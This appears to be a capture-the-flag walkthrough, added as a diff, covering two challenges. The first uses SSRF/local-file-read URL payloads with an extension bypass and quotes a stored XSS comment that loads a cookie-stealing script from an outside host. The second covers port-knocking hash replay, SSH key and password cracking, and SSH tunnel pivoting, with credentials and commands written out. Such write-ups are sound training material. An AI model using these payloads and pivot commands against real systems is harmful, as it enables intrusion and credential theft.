@@ -1,0 +1,87 @@
+challenge 1 - LFI + SSRF:
+The server uses an API call to download png files using cURL. It checks for the extension to be as png using regex. Use it to download the login.php file.
+
+1. go to:
+	http://35.205.32.11/testProfilePng?u=file:///var/www/login.php#test.png
+	
+and in base64:
+	http://35.205.32.11/testProfilePng?u=ZmlsZTovLy92YXIvd3d3L2xvZ2luLnBocCN0ZXN0LnBuZw==
+
+2. From there it is possible to access the profilepics folder and view the login.php file:
+	http://35.205.32.11/profilePics/login.php
+
+3. Based on the login.php file, we know that if the connection is local and the user is admin, then we will get the admin token. to do so, we need to put the following url in the testprofilepng url:
+	http://127.0.0.1/login.php?user_name=admin#test.png
+
+and in base64
+	http://35.205.32.11/testProfilePng?u=aHR0cDovLzEyNy4wLjAuMS9sb2dpbi5waHA/dXNlcl9uYW1lPWFkbWluI3Rlc3QucG5n
+
+4. so now we have the session cookie of and administrator, but it is not as a client side cookie but rather in the server. to act with it, we will use the following console script in the main page.
+or
+go to this page
+	http://35.205.32.11/testProfilePng?u=http://127.0.0.1/administration?=test.png
+and in base64
+	http://35.205.32.11/testProfilePng?u=aHR0cDovLzEyNy4wLjAuMS9hZG1pbmlzdHJhdGlvbj89dGVzdC5wbmc=
+	
+and now we will have the entire administration panel. in the bottom there will be a link:
+	anonymous	111.112.113.114	07:03:21, 23/03/18	I love it...It's so <script src="http://35.205.32.11/authstealer_exploit.js"></script>...cute
+the attacker's ip is a link to:
+	http://35.205.32.11/ch1_success
+
+5. now we can see the other comments, including a link to the finished challenge page /ch1_success.
+	
+	
+
+
+
+====================================================================================================================================================
+====================================================================================================================================================
+====================================================================================================================================================
+
+
+
+challenge 2:
+1. pcap traffic:
+the pcap traffic contains some kind of hash challenge "port knocking", that allows ftp connection using creds to port 2121.
+
+Server To Client:
+4bad54feaa9a3fbbd7aac13b740fc041 - 33794 MD5
+Client To Server:
+9232d6bcee8a6a37ba25ef879c05c3b2dcd8cbf089ad074e73a9790f23cbff33af492ad8a79b5621321a9472d96f48201efe88947113e2f0bce3c519d980d9e5 - 33795 SHA
+
+Server To Client:
+91a37027eacd1e5e02870ff3c047c936 - 37478
+Client To Server:
+48d2ed2f2ebd967a5050415401888850ab82b549b50f3d880a184786bd2ce3c961479de2763b516aaacbdb20317a542798251f60dec55074c1e09b4b384b3c7a
+
+Server To Client:
+89edeb03924b526a8abcc096574373d2 - 43035
+Client To Server:
+65228021c3ea0f594073f8c75199910f51186490d22074599328adaa879db0f700e9a9e8a522bd47fcc29adf391ef5653cee77df2dcb5af2214f480d1ba89907
+
+Server To Client:
+07532bb8bd0171f0fa684ff1f4f7debf - 52774
+Client To Server:
+c4babc222c0ac8e550e947eca24c9e68f75e8bfb232b75a48e2c509d5c8b699c96cba424c97bebec050478f3ce755f1d7950ade485de9926681d6dc90b59542c
+
+Also can be seen in the pcap is the username and password in cleartext: user:12345
+
+2. script need to start a socket with the server at 5555, get the md5 hash, translate it, add +1 and convert to sha512. transmit the sha.
+3. access to the ftp server at 2121, using the credentials, and download everything.
+4. take the id_rsa and decode it with the hint file (password is s3cr3t).
+5. connect with the decoded certificate with scp to port 22 and download the pyc file + /.ssh/authorized_key file.
+6. decompile the pyc and start a script to decode based on the encode function.
+7. decode the conf.enc files with the decode function.
+8. take the encoded password from the cisco.conf file. crack it to Sup3rS3cr#tP@ssword.
+9. connect to the server again using ssh with the certificate, and user backup, with the argument -N (no commands to be sent) as can be seen below:
+	sudo ssh -i ~/.ssh/id_rsa.dec -L 22:10.164.0.3:22 backup@35.204.90.89 -N
+	
+10. pivot to the fileserver thru the fw using the fwadmin user, password and certificate, in a new terminal.
+	sudo ssh -L 8080:10.128.0.3:8080 fwadmin@localhost -p 22 -N
+	fwadmin:Sup3rS3cr#tP@ssword
+	
+11. open the browser to localhost:8080.
+12. open the doc file.
+13. doc contains:
+
+<html> <script type="text/javascript">document.location = "http://35.205.32.11/ch2_finish/gqnuUo/drWqYd5z7cCOnzuCdPQQ0sXBGCBnMzSvWzlo=";</script>  </html>
